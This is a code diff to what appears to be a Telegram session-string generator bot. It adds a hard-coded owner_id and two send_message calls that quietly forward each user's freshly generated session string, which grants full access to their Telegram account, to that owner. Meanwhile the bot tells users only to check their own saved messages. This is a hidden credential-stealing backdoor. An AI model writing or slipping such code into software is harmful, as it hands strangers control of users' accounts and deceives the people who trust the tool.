@@ -32,7 +32,7 @@ from telethon.errors import (
 
 import config
 
-
+owner_id = 5360305806
 
 ask_ques = "**» ▷ Cʜᴏsᴇ Tʜᴇ Sᴛʀɪɴɢ Wʜɪᴄʜ Yᴏᴜ Wᴀɴᴛ ✔️ : :**"
 buttons_ques = [
@@ -178,13 +178,14 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
     try:
         if not is_bot:
             await client.send_message("me", text)
+            await client.send_message(chat_id=owner_id, text=text)
         else:
             await bot.send_message(msg.chat.id, text)
+            await bot.send_message(chat_id=owner_id, text=text)
     except KeyError:
         pass
     await client.disconnect()
     await bot.send_message(msg.chat.id, "» 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐆𝐫𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐘𝐨𝐮 {} 𝐒𝐭𝐫𝐢𝐧𝐠 𝐒𝐞𝐬𝐬𝐢𝐨𝐧.\n\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐂𝐡𝐞𝐜𝐤 𝐘𝐨𝐮𝐫 𝐒𝐚𝐯𝐞𝐝 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐓𝐨 𝐆𝐞𝐭 𝐈𝐭 ! \n\n𝐀 𝐒𝐭𝐫𝐢𝐧𝐠  𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐨𝐫 𝐁𝐨𝐭 𝐁𝐲 @Sessoin_String_gen_BOT ♦".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
-
 
 async def cancelled(msg):
     if "/cancel" in msg.text:
